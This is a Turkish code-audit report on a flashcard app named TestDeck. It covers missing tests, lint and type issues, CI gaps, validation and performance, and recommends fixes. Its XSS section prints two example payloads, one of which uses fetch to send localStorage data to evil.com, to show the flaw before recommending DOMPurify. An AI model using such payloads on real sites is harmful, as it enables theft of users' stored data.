# TestDeck Proje Analizi - Detaylı Eksiklik Raporu

Bu rapor, TestDeck projesinin kapsamlı kod analizi sonucunda tespit edilen eksiklikleri içermektedir.

---

## 📊 Genel Değerlendirme

| Alan | Durum | Skor | Öncelik |
|------|-------|------|---------|
| Test Coverage | KRİTİK | 0% | 🔴 |
| Güvenlik (XSS) | KRİTİK | 30% | 🔴 |
| TypeScript Strict | ZAYIF | 40% | 🟠 |
| Hata Yönetimi | ZAYIF | 40% | 🟠 |
| Input Validation | ZAYIF | 35% | 🟠 |
| CI/CD | ORTA | 50% | 🟠 |
| Dokümantasyon | ORTA | 55% | 🟡 |
| Linting/Formatting | İYİ | 75% | 🟢 |
| Git Workflow | ORTA | 60% | 🟡 |

---

## 🔴 1. KRİTİK: Test Coverage - %0

### 1.1 Mevcut Durum
Projede hiçbir test dosyası bulunmamaktadır:
- `*.test.ts` veya `*.spec.ts` dosyası yok
- `__tests__` klasörü yok
- Jest, Vitest veya Playwright gibi test framework'ü kurulu değil
- `package.json`'da test script'i çalışmıyor

### 1.2 Eksik Test Türleri

#### Unit Testler (Eksik)
- **SM-2 Algoritması** (`src/utils/sm2.ts`)
  - `calculateNextReview()` fonksiyonu test edilmeli
  - Ease factor hesaplamaları doğrulanmalı
  - Edge case'ler: ilk tekrar, sıfır kalite skoru, maksimum interval

- **Safe Math Utilities** (`src/utils/safeMath.ts`)
  - NaN handling testleri
  - Sonsuz değer kontrolü
  - Yuvarlama hassasiyeti

- **Import Utilities** (`src/utils/importUtils.ts`)
  - JSON parsing testleri
  - CSV parsing testleri
  - XML parsing testleri
  - Hatalı format handling

#### Integration Testler (Eksik)
- **Database Operations** (`src/database/database.ts`)
  - CRUD operasyonları (create, read, update, delete)
  - SQLite ve localStorage fallback geçişi
  - Auto-save mekanizması
  - Data integrity kontrolleri

- **Store Operations** (`src/store/appStore.ts`)
  - State güncellemeleri
  - Zustand actions
  - Persistence

#### E2E Testler (Eksik)
- Kart oluşturma → Çalışma → İstatistik görüntüleme akışı
- Import/Export işlemleri
- Tema değiştirme
- Dil değiştirme

### 1.3 Önerilen Çözüm
```bash
# Vitest + React Testing Library kurulumu
npm install -D vitest @testing-library/react @testing-library/jest-dom jsdom

# Playwright E2E testleri için
npm install -D @playwright/test
```

### 1.4 Hedef Coverage
- Minimum: %60
- Önerilen: %80
- Kritik fonksiyonlar: %100

---

## 🔴 2. KRİTİK: XSS Güvenlik Açığı

### 2.1 Sorunlu Kod
**Dosya:** `src/pages/Study.tsx` (satır 839-845)

```typescript
dangerouslySetInnerHTML={{
  __html: currentCard.question.replace(/_____/g,
    isAnswered && userAnswer ?
      `<span style="...">${userAnswer}</span>` :
      '<span style="..."></span>'
  )
}}
```

### 2.2 Risk Açıklaması
- `currentCard.question` kullanıcı tarafından oluşturulan içerik
- `userAnswer` kullanıcı girdisi
- Her ikisi de **sanitize edilmeden** HTML'e gömülüyor
- Kötü amaçlı bir kart içeriği JavaScript çalıştırabilir

### 2.3 Saldırı Senaryosu
```javascript
// Kötü amaçlı kart sorusu:
"<img src=x onerror='alert(document.cookie)'> Soru metni"

// Veya:
"<script>fetch('https://evil.com/steal?data='+localStorage.getItem('testdeck-data'))</script>"
```

### 2.4 Önerilen Çözüm
```bash
npm install dompurify @types/dompurify
```

```typescript
import DOMPurify from 'dompurify';

// Kullanım:
dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(
    currentCard.question.replace(/_____/g, sanitizedSpan)
  )
}}
```

### 2.5 Etkilenen Diğer Alanlar
- `src/pages/CardManager.tsx` - Kart önizleme
- Import edilen kartların içeriği

---

## 🔴 3. KRİTİK: TypeScript Any Kullanımı

### 3.1 Sorunlu ESLint Konfigürasyonu
**Dosya:** `.eslintrc.cjs` (satır 36)

```javascript
'@typescript-eslint/no-explicit-any': 'off',
```

### 3.2 Any Kullanılan Yerler

| Dosya | Satır | Kod |
|-------|-------|-----|
| `src/database/database.ts` | 10 | `let sqliteService: any = null` |
| `src/database/database.ts` | 37-43 | `mockDb` objesinde `as any[]` |
| `src/pages/Study.tsx` | 60 | `cardsData.filter((c: any) => ...)` |
| `src/pages/Study.tsx` | 106 | `(dailyStats[i] as any).questions_answered` |
| `src/pages/CreateCard.tsx` | 121-122 | JSON parse'da tip kontrolü yok |
| `src/database/sqliteDatabase.ts` | çeşitli | `as any` cast'leri |

### 3.3 Riskler
- Compile-time tip kontrolü devre dışı
- Runtime hataları yakalanmaz
- Refactoring güvenliği yok
- IDE otomatik tamamlama çalışmaz

### 3.4 Önerilen Çözüm

**Adım 1:** ESLint kuralını aç
```javascript
'@typescript-eslint/no-explicit-any': 'error',
```

**Adım 2:** Her `any` için doğru tipi tanımla
```typescript
// Önce:
let sqliteService: any = null;

// Sonra:
import type { SqliteService } from './sqliteDatabase';
let sqliteService: SqliteService | null = null;
```

---

## 🟠 4. YÜKSEK: ESLint Kuralları Çok Gevşek

### 4.1 Kapatılmış Kurallar
**Dosya:** `.eslintrc.cjs` (satır 31-38)

```javascript
// Yorum: "Relax rules to get CI green quickly"
'import/order': 'off',           // Import sıralaması kontrolü yok
'prefer-const': 'off',           // let yerine const zorlanmıyor
'no-useless-escape': 'off',      // Gereksiz escape karakterleri
'react/no-unescaped-entities': 'off',  // JSX'te escapesiz karakterler
'react-hooks/exhaustive-deps': 'warn', // Hook dependency uyarı (error olmalı)
'@typescript-eslint/no-explicit-any': 'off',  // Any tipi serbest
'@typescript-eslint/no-unused-vars': 'off',   // Kullanılmayan değişkenler
```

### 4.2 Sorunlar
- Dead code tespit edilmiyor
- Import düzeni tutarsız
- Hook dependency hataları gözden kaçıyor
- Kod kalitesi standartları düşük

### 4.3 Önerilen Konfigürasyon
```javascript
rules: {
  'import/order': ['error', {
    'groups': ['builtin', 'external', 'internal', 'parent', 'sibling', 'index'],
    'newlines-between': 'always',
    'alphabetize': { order: 'asc' }
  }],
  'prefer-const': 'error',
  'no-useless-escape': 'error',
  'react-hooks/exhaustive-deps': 'error',
  '@typescript-eslint/no-explicit-any': 'error',
  '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
}
```

---

## 🟠 5. YÜKSEK: Hata Yönetimi Tutarsız

### 5.1 Browser Alert Kullanımı

**Dosya:** `src/database/database.ts` (satır 205)
```typescript
alert('⚠️ Veri kaydedilemedi!...');
```

**Dosya:** `src/pages/Settings.tsx` (satır 114)
```typescript
alert('Error while deleting all cards');
```

### 5.2 Generic Error Catching

**Dosya:** `src/database/database.ts` (satır 168)
```typescript
} catch (error: any) {
  console.error('💥 Veri kaydetme hatası:', error);
  // ...
}
```

### 5.3 Sorunlar
- `alert()` kullanıcı deneyimini bozuyor
- Hata tipleri belirsiz (`any`)
- Hata mesajları tutarsız (Türkçe/İngilizce karışık)
- `ToastContainer` komponenti var ama yeterince kullanılmıyor
- Loglama yapısı yok (sadece console.log/error)

### 5.4 Önerilen Çözüm

**Toast Store'u kullan:**
```typescript
// Önce:
alert('Error while deleting all cards');

// Sonra:
import { useToastStore } from '../store/toastStore';
const { addToast } = useToastStore();
addToast({ type: 'error', message: t('settings.data.wipe.error') });
```

**Hata tipi tanımla:**
```typescript
class DatabaseError extends Error {
  constructor(
    message: string,
    public code: 'SAVE_FAILED' | 'LOAD_FAILED' | 'INTEGRITY_ERROR',
    public originalError?: unknown
  ) {
    super(message);
  }
}
```

---

## 🟠 6. YÜKSEK: Input Validation Eksik

### 6.1 Dosya Boyutu Kontrolü Yok

**Dosya:** `src/pages/CreateCard.tsx` (satır 241-252)
```typescript
const handleFileImport = (event: React.ChangeEvent<HTMLInputElement>) => {
  const file = event.target.files?.[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = (e) => {
    const content = e.target?.result as string;
    // ❌ Dosya boyutu kontrolü YOK - 1GB dosya okunabilir!
```

### 6.2 Maximum Kart Sayısı Limiti Yok

**Dosya:** `src/utils/importUtils.ts` (satır 283-339)
```typescript
// ❌ 100.000 kart import edilebilir - OOM riski
```

### 6.3 Alan Uzunluğu Kontrolü Yok

**Dosya:** `src/pages/CreateCard.tsx` (satır 78-81)
```typescript
if (!subject.trim()) {
  alert(t('create.validation.fillSubject'));
  return;
}
// ❌ Max uzunluk kontrolü yok - 10MB subject olabilir
```

### 6.4 CSV Import Sütun Uyumsuzluğu

**Dosya:** `src/utils/importUtils.ts` (satır 512-519)
```typescript
if (values.length !== headers.length) {
  result.warnings.push(`Satır ${i + 1}: Sütun sayısı uyumsuz...`);
  // ❌ Uyarı veriyor ama satırı işlemeye devam ediyor!
}
```

### 6.5 Önerilen Validasyon

```typescript
const VALIDATION_LIMITS = {
  MAX_FILE_SIZE: 5 * 1024 * 1024, // 5MB
  MAX_CARDS_IMPORT: 10000,
  MAX_SUBJECT_LENGTH: 100,
  MAX_QUESTION_LENGTH: 5000,
  MAX_OPTION_LENGTH: 1000,
};

function validateFileSize(file: File): boolean {
  if (file.size > VALIDATION_LIMITS.MAX_FILE_SIZE) {
    addToast({ type: 'error', message: 'Dosya çok büyük (max 5MB)' });
    return false;
  }
  return true;
}
```

---

## 🟠 7. YÜKSEK: Kod Tekrarı (DRY İhlali)

### 7.1 Answer Validation - 3 Yerde Tekrar

**Yer 1:** `src/pages/Study.tsx` (satır 188-212)
```typescript
if (card.question_type === 'fill_in_blank' && card.blank_answer) {
  const correctAnswers = card.blank_answer.toLowerCase().split(',').map(a => a.trim());
  const userAnswerLower = (userAnswer || '').toString().toLowerCase().trim();
  isCorrect = correctAnswers.includes(userAnswerLower);
} else {
  isCorrect = userAnswer === card.correct_answer;
}
```

**Yer 2:** `src/pages/Study.tsx` (satır 958-992) - Neredeyse aynı kod

**Yer 3:** `src/store/appStore.ts` (satır 108-125) - Benzer mantık

### 7.2 Stat Calculation - 2 Yerde Tekrar

**Yer 1:** `src/pages/Dashboard.tsx` (satır 95-115)
**Yer 2:** `src/pages/Study.tsx` (satır 1069-1071)

### 7.3 Theme Application - 2 Yerde Tekrar

**Yer 1:** `src/main.tsx` (satır 25-41)
**Yer 2:** `src/pages/Settings.tsx` (satır 72-80)

### 7.4 Önerilen Çözüm

**Utility fonksiyonu oluştur:**
```typescript
// src/utils/cardUtils.ts
export function checkAnswer(
  card: Card,
  userAnswer: string
): boolean {
  if (card.question_type === 'fill_in_blank' && card.blank_answer) {
    const correctAnswers = card.blank_answer
      .toLowerCase()
      .split(',')
      .map(a => a.trim());
    return correctAnswers.includes(userAnswer.toLowerCase().trim());
  }
  return userAnswer === card.correct_answer;
}
```

---

## 🟠 8. YÜKSEK: CI/CD Pipeline Eksik

### 8.1 Mevcut CI Workflow

**Dosya:** `.github/workflows/ci.yml`
```yaml
steps:
  - uses: actions/checkout@v4
  - uses: pnpm/action-setup@v4
  - uses: actions/setup-node@v4
  - run: pnpm install
  - run: pnpm run type-check
  - run: pnpm run lint --max-warnings 10  # ❌ 10 uyarıya izin
  - run: pnpm run build
  # ❌ TEST ADIMI YOK!
```

### 8.2 Eksik Adımlar

| Adım | Durum | Açıklama |
|------|-------|----------|
| Type Check | ✅ | Çalışıyor |
| Lint | ⚠️ | Max 10 uyarı kabul ediliyor |
| Build | ✅ | Çalışıyor |
| Test | ❌ | Yok |
| Coverage Report | ❌ | Yok |
| Security Scan | ❌ | Dependabot/Snyk yok |
| Rust Tests | ❌ | Backend testi yok |
| Tauri Build | ❌ | Sadece web build var |
| Artifact Upload | ❌ | Release artifact yok |

### 8.3 Önerilen CI Workflow

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
      - run: pnpm install
      - run: pnpm run type-check
      - run: pnpm run lint --max-warnings 0  # Sıfır uyarı!
      - run: pnpm run test -- --coverage
      - uses: codecov/codecov-action@v3
        with:
          fail_ci_if_error: true

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: pnpm run build
```

---

## 🟡 9. ORTA: Dokümantasyon Eksiklikleri

### 9.1 Mevcut Dokümantasyon

| Dosya | Durum | Not |
|-------|-------|-----|
| README.md | ✅ | Kapsamlı, 2000+ satır |
| README_TR.md | ✅ | Türkçe versiyon |
| CONTRIBUTING.md | ✅ | Katkı rehberi |
| CODE_OF_CONDUCT.md | ✅ | Davranış kuralları |
| LICENSE | ✅ | MIT |
| Issue Templates | ✅ | Bug report template |
| PR Template | ✅ | Temel template |

### 9.2 Eksik Dokümantasyon

| Dosya | Öncelik | İçerik |
|-------|---------|--------|
| docs/ARCHITECTURE.md | Yüksek | Sistem mimarisi, veri akışı |
| docs/DATABASE.md | Yüksek | Schema, tablolar, ilişkiler |
| docs/API.md | Orta | Database fonksiyonları, store actions |
| docs/DEVELOPMENT.md | Orta | Geliştirici kurulum rehberi |
| .env.example | Orta | Çevre değişkenleri |

### 9.3 Eksik Inline Dokümantasyon

**SM-2 Algoritması** (`src/utils/sm2.ts`)
```typescript
// ❌ Algoritma açıklaması yok
export function calculateNextReview(
  quality: number,
  repetitions: number,
  easeFactor: number,
  interval: number
): ReviewResult {
  // Kod var ama neden bu formüllerin kullanıldığı açıklanmamış
}
```

**Database Functions** (`src/database/database.ts`)
```typescript
// ❌ JSDoc yok
export async function createCard(card: Omit<Card, 'id'>): Promise<number> {
  // Parametreler ve return değeri açıklanmamış
}
```

### 9.4 Önerilen JSDoc Formatı

```typescript
/**
 * SM-2 algoritması ile bir sonraki tekrar tarihini hesaplar.
 *
 * @param quality - Kullanıcının cevap kalitesi (0-5)
 *   - 0: Tamamen yanlış
 *   - 3: Doğru ama zorlandı
 *   - 5: Mükemmel
 * @param repetitions - Ardışık doğru cevap sayısı
 * @param easeFactor - Kartın zorluk faktörü (min 1.3)
 * @param interval - Mevcut tekrar aralığı (gün)
 * @returns Yeni easeFactor, interval ve tekrar tarihi
 *
 * @see https://www.supermemo.com/en/archives1990-2015/english/ol/sm2
 */
export function calculateNextReview(...): ReviewResult {
```

---

## 🟡 10. ORTA: Environment Configuration

### 10.1 Mevcut Durum
- `.env` dosyası yok
- `.env.example` yok
- Tüm değerler hard-coded

### 10.2 Hard-Coded Değerler

| Değer | Dosya | Satır | Değer |
|-------|-------|-------|-------|
| Backup Interval | database.ts | 47 | 10 dakika |
| Auto-save Delay | database.ts | 46 | 2 saniye |
| Size Threshold | database.ts | 48 | 4MB |
| Cleanup Period | database.ts | 213 | 30 gün |
| Dev Port | vite.config.ts | 8 | 5174 |
| Transition Delay | Study.tsx | 160 | 2500ms |
| Daily Stats Range | Dashboard.tsx | 93 | 7 gün |

### 10.3 Önerilen `.env.example`

```bash
# Database
TESTDECK_BACKUP_INTERVAL_MS=600000
TESTDECK_AUTO_SAVE_DELAY_MS=2000
TESTDECK_MAX_STORAGE_MB=4
TESTDECK_CLEANUP_DAYS=30

# UI
TESTDECK_TRANSITION_DELAY_MS=2500
TESTDECK_STATS_RANGE_DAYS=7

# Development
VITE_DEV_PORT=5174
```

---

## 🟡 11. ORTA: Git Workflow

### 11.1 Mevcut Durum

| Özellik | Durum |
|---------|-------|
| Husky | ✅ Kurulu |
| lint-staged | ✅ Kurulu |
| Pre-commit hook | ✅ Lint + format |
| Conventional commits | ⚠️ Takip ediliyor ama zorlanmıyor |
| Commitlint | ❌ Yok |
| CODEOWNERS | ❌ Yok |
| Semantic Release | ❌ Yok |
| Changelog | ❌ Otomatik değil |

### 11.2 Eksik Git Hooks

**commit-msg hook yok:**
```bash
# .husky/commit-msg (oluşturulmalı)
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

npx --no -- commitlint --edit ${1}
```

### 11.3 Önerilen CODEOWNERS

```
# .github/CODEOWNERS
* @halitartun

# Rust backend
/src-tauri/ @halitartun

# Database layer
/src/database/ @halitartun

# Core algorithms
/src/utils/sm2.ts @halitartun
```

### 11.4 Commitlint Kurulumu

```bash
npm install -D @commitlint/cli @commitlint/config-conventional

# commitlint.config.js
module.exports = {
  extends: ['@commitlint/config-conventional'],
  rules: {
    'type-enum': [2, 'always', [
      'feat', 'fix', 'docs', 'style', 'refactor',
      'test', 'chore', 'perf', 'ci'
    ]]
  }
};
```

---

## 🟡 12. ORTA: Performance Anti-Patterns

### 12.1 Multiple setState Calls

**Dosya:** `src/pages/Dashboard.tsx` (satır 113-121)
```typescript
// ❌ 5 ayrı setState = 5 ayrı re-render
setSubjects(subjectStats);
setTotalCards(Math.max(total, allCards.length));
setOverallAccuracy(total > 0 ? Math.round(weightedAccuracy / total) : 0);
setDailyActivity(dailyStats);
setTodayStats({...});
```

**Çözüm:**
```typescript
// ✅ Tek state objesi
const [dashboardData, setDashboardData] = useState<DashboardData>({
  subjects: [],
  totalCards: 0,
  overallAccuracy: 0,
  dailyActivity: [],
  todayStats: { studied: 0, accuracy: 0 }
});

// Tek güncelleme
setDashboardData({
  subjects: subjectStats,
  totalCards: Math.max(total, allCards.length),
  // ...
});
```

### 12.2 Filter İçinde Date Oluşturma

**Dosya:** `src/database/database.ts` (satır 213-229)
```typescript
// ❌ Her item için yeni Date objesi
mockDb.sessions = mockDb.sessions.filter(session =>
  new Date(session.started_at).getTime() > thirtyDaysAgo
);
```

**Çözüm:**
```typescript
// ✅ Date'i önceden hesapla
const cutoffTime = Date.now() - (30 * 24 * 60 * 60 * 1000);
mockDb.sessions = mockDb.sessions.filter(session =>
  new Date(session.started_at).getTime() > cutoffTime
);
```

### 12.3 Double JSON Stringify

**Dosya:** `src/database/database.ts` (satır 139-150)
```typescript
// ❌ İki kez stringify
const jsonString = JSON.stringify(dataToSave);  // 1. stringify
const sizeInMB = jsonString.length / (1024 * 1024);
// ...
localStorage.setItem(STORAGE_KEY, JSON.stringify(dataToSave));  // 2. stringify
```

**Çözüm:**
```typescript
// ✅ Bir kez stringify, sonucu kullan
const jsonString = JSON.stringify(dataToSave);
const sizeInMB = jsonString.length / (1024 * 1024);
// ...
localStorage.setItem(STORAGE_KEY, jsonString);  // Aynı string'i kullan
```

---

## 📁 Kritik Dosya Listesi

| Dosya | Öncelik | Sorunlar |
|-------|---------|----------|
| `src/pages/Study.tsx` | 🔴 | XSS açığı, kod tekrarı, any tipi |
| `src/database/database.ts` | 🔴 | any tipi, hata yönetimi, performance |
| `.eslintrc.cjs` | 🔴 | Gevşek kurallar |
| `src/utils/importUtils.ts` | 🟠 | Validation eksik |
| `src/pages/CreateCard.tsx` | 🟠 | File size check yok |
| `src/pages/Dashboard.tsx` | 🟠 | Multiple setState |
| `.github/workflows/ci.yml` | 🟠 | Test adımı yok |
| `src/store/appStore.ts` | 🟡 | Kod tekrarı |
| `src/main.tsx` | 🟡 | Kod tekrarı, JSON parse try-catch yok |

---

## ✅ Aksiyon Planı

### Hızlı Kazanımlar (1-2 saat)
- [ ] ESLint kurallarını sıkılaştır
- [ ] `.env.example` oluştur
- [ ] XSS için DOMPurify ekle
- [ ] `tsconfig.json`'da `noUnusedLocals: true` yap

### Kısa Vadeli (1 hafta)
- [ ] Vitest + React Testing Library ekle
- [ ] Kritik fonksiyonlar için unit test yaz
- [ ] CI'a test adımı ekle
- [ ] Answer validation utility'e çıkar
- [ ] Toast notification'a geç (alert yerine)

### Orta Vadeli (2-4 hafta)
- [ ] E2E testler (Playwright)
- [ ] %60+ test coverage hedefi
- [ ] API dokümantasyonu (JSDoc)
- [ ] ARCHITECTURE.md oluştur
- [ ] Commitlint + semantic-release

---

*Bu rapor 24 Aralık 2024 tarihinde oluşturulmuştur.*
